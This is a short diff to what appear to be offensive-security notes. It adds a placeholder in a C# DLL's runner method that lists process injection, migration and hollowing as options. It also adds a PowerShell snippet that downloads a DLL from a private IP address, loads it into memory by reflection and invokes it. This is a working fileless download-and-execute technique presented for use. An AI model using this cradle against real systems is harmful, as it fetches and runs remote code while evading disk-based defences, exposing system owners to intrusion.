@@ -51,6 +51,19 @@ public class Class1
 
     public static void runner()
     {
+
+        Whichever method you want.  same process thread / migration / hollowing
     }
 }  
+```
+
+##### to run this DLL you can use reflection
+
+``` powershell
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.120/ClassLibrary1.dll')
+
+$assem = [System.Reflection.Assembly]::Load($data)
+$class = $assem.GetType("ClassLibrary1.Class1")
+$method = $class.GetMethod("runner")
+$method.Invoke(0, $null)
 ```
